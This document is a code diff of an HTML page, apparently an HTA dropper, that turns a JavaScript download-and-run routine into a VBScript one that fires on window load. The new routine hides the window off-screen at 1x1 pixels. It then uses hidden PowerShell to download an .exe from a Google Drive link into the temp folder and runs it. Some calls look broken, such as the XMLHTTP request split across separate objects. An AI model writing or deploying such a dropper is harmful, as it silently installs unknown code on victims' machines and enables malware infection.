@@ -4,32 +4,32 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Download and Execute File</title>
-    <script type="text/javascript">
-        function downloadAndRun() {
-            var objShell = new ActiveXObject("WScript.Shell");
+    <script type="text/vbscript">
+        Sub Window_onLoad
+            Window.resizeTo 1, 1
+            Window.MoveTo -32000, -32000
+            Call CreateObject("MSXML2.XMLHTTP").Open("GET", "https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H", False)
+            Call CreateObject("MSXML2.XMLHTTP").Send()
+            
+            Dim objShell, tempFolder, downloadUrl, randomFileName, downloadedFile
+            Set objShell = CreateObject("WScript.Shell")
+            tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%")
+            downloadUrl = "https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H" ' Replace with actual URL
+            randomFileName = "downloaded" & Int((1000) * Rnd) & ".exe"
+            downloadedFile = tempFolder & "\" & randomFileName
 
-            // Define temp folder and download URL
-            var tempFolder = objShell.ExpandEnvironmentStrings("%TEMP%");
-            var downloadUrl = "https://drive.google.com/uc?export=download&id=1pjn7VlGpYkvUd44Q6toYv712IgZZtx8H"; // Replace with actual URL
-            var randomFileName = "downloaded" + Math.floor(Math.random() * 1000) + ".exe";
-            var downloadedFile = tempFolder + "\\" + randomFileName;
+            cmdCommand = "powershell.exe -Command ""Invoke-WebRequest -Uri " & downloadUrl & " -OutFile " & downloadedFile & """"
+            objShell.Run "cmd.exe /c " & cmdCommand, 0, True
 
-            // PowerShell command to download file
-            var cmdCommand = 'powershell.exe -Command "Invoke-WebRequest -Uri ' + downloadUrl + ' -OutFile ' + downloadedFile + '"';
-
-            // Run the command
-            objShell.Run("cmd.exe /c " + cmdCommand, 0, true);
-
-            // Wait for the file to be downloaded and then run it
-            var fso = new ActiveXObject("Scripting.FileSystemObject");
-            while (!fso.FileExists(downloadedFile)) {
-                WScript.Sleep(1000); // Wait for the file to be downloaded
-            }
-            objShell.Run(downloadedFile);
-        }
+            Set fso = CreateObject("Scripting.FileSystemObject")
+            Do Until fso.FileExists(downloadedFile)
+                WScript.Sleep 1000
+            Loop
+            objShell.Run downloadedFile
+        End Sub
     </script>
 </head>
-<body onload="downloadAndRun();">
-    <h1>Downloading and Running File</h1>
+<body>
+    <h1>Downloading and Running File...</h1>
 </body>
 </html>
